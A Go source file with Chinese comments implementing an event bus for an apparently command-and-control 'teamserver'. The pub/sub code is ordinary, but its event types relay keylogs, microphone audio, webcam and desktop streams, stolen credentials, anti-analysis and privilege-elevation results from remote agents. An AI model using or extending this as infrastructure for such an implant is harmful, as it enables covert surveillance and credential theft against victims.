// Package eventbus 事件总线: 全局事件(会话上下线)与会话级事件(数据流/心跳)。
// 照搬自旧 Server events.go, 去掉包级单例, 改为可实例化 Hub(便于测试/多实例)。
package eventbus

import (
	"sync"
	"sync/atomic"
	"time"

	"cleat/teamserver/internal/logx"
)

// 事件类型常量(对齐旧 Server 与 Agent 推送)。
const (
	EventSessionOnline    = "session_online"     // 会话上线(全局)
	EventSessionOffline   = "session_offline"    // 会话下线(全局)
	EventHeartbeat        = "heartbeat"          // 心跳(会话)
	EventKeylog           = "keylog"             // 按键记录(会话)
	EventAudioData        = "audio_data"         // 录音数据(会话)
	EventCameraStream     = "camstream_data"     // 摄像头流帧(会话)
	EventDesktopStream    = "deskstream_data"    // 桌面流帧(会话)
	EventTerminalOutput   = "terminal_output"    // 远程终端输出(会话)
	EventFileDownload     = "file_download_data" // 文件下载分块(会话)
	EventFileDownloadErr  = "file_download_error"
	EventFileDownloadDone = "file_download_complete"
	EventFileUploadDone   = "file_upload_complete"
	EventFileUploadErr    = "file_upload_error"
	EventCredential       = "credential_data"
	EventAntiAnalysis     = "anti_analysis"
	EventElevation        = "elevation"
	EventDiscovery        = "discovery"
	EventLog              = "event_log"
	EventClipboard        = "clipboard_data"
	EventFileChange       = "file_change"
)

// 订阅通道缓冲容量。此前 64 太小: 桌面流/键盘记录等高频事件在 SSE 客户端
// 处理稍慢时就会塞满并被非阻塞丢弃(命令结果偶发"点了没反应"的容量根因)。
const subBufferSize = 1024

// publishWait 发布阻塞等待时长: 给慢订阅者 200ms 排空窗口, 仍满才丢弃。
const publishWait = 200 * time.Millisecond

// Event 是推送给 Web 端的事件载荷。
// Seq 为全局递增序号: 客户端可用它检测断连期间是否丢事件(gap 对账)。
type Event struct {
	Type      string      `json:"type"`
	SessionID int         `json:"session_id,omitempty"`
	Data      interface{} `json:"data,omitempty"`
	TS        int64       `json:"ts"`
	Seq       uint64      `json:"seq"`
}

// Hub 事件总线:全局 + 会话级订阅者。
type Hub struct {
	mu      sync.Mutex
	global  map[chan Event]bool
	perSess map[int]map[chan Event]bool
	// seq 全局事件序号(按发布顺序递增, 订阅者据此对账丢事件)
	seq uint64
	// dropped 累计被丢弃的事件数(通道满且阻塞窗口仍无法写入), 用于可观测。
	dropped uint64
}

// New 创建事件总线。
func New() *Hub {
	return &Hub{
		global:  make(map[chan Event]bool),
		perSess: make(map[int]map[chan Event]bool),
	}
}

// SubscribeGlobal 订阅全局事件流,返回事件通道。
func (h *Hub) SubscribeGlobal() chan Event {
	ch := make(chan Event, subBufferSize)
	h.mu.Lock()
	h.global[ch] = true
	h.mu.Unlock()
	return ch
}

// SubscribeSession 订阅指定会话的事件流。
func (h *Hub) SubscribeSession(sessionID int) chan Event {
	ch := make(chan Event, subBufferSize)
	h.mu.Lock()
	if h.perSess[sessionID] == nil {
		h.perSess[sessionID] = make(map[chan Event]bool)
	}
	h.perSess[sessionID][ch] = true
	h.mu.Unlock()
	return ch
}

// Unsubscribe 取消订阅。
func (h *Hub) Unsubscribe(sessionID int, ch chan Event) {
	h.mu.Lock()
	defer h.mu.Unlock()
	if sessionID > 0 {
		if m, ok := h.perSess[sessionID]; ok {
			if _, ok := m[ch]; ok {
				delete(m, ch)
				close(ch)
				if len(m) == 0 {
					delete(h.perSess, sessionID)
				}
			}
		}
		return
	}
	if _, ok := h.global[ch]; ok {
		delete(h.global, ch)
		close(ch)
	}
}

// publish 向单个订阅通道投递事件: 优先非阻塞, 失败后给 publishWait 排空窗口,
// 仍失败则丢弃并计入 dropped(慢订阅者不再拖垮全局发布)。
func (h *Hub) publish(ch chan Event, ev Event) {
	select {
	case ch <- ev:
		return
	default:
	}
	select {
	case ch <- ev:
	case <-time.After(publishWait):
		atomic.AddUint64(&h.dropped, 1)
		logx.Printf("[eventbus] 丢弃事件 %s(sid=%d): 订阅通道积压超过 %d, 请检查前端 SSE 消费\n",
			ev.Type, ev.SessionID, subBufferSize)
	}
}

// PublishGlobal 发布全局事件。
func (h *Hub) PublishGlobal(ev Event) {
	ev.Seq = atomic.AddUint64(&h.seq, 1)
	h.mu.Lock()
	defer h.mu.Unlock()
	for ch := range h.global {
		h.publish(ch, ev)
	}
}

// PublishSession 发布会话级事件。
func (h *Hub) PublishSession(sessionID int, ev Event) {
	ev.Seq = atomic.AddUint64(&h.seq, 1)
	h.mu.Lock()
	defer h.mu.Unlock()
	for ch := range h.perSess[sessionID] {
		h.publish(ch, ev)
	}
}

// Dropped 返回累计丢弃事件数(0 表示从未因通道积压丢事件)。
func (h *Hub) Dropped() uint64 {
	return atomic.LoadUint64(&h.dropped)
}

// NewEvent 构造事件。
func NewEvent(typ string, sessionID int, data interface{}) Event {
	return Event{
		Type:      typ,
		SessionID: sessionID,
		Data:      data,
		TS:        time.Now().UnixMilli(),
	}
}
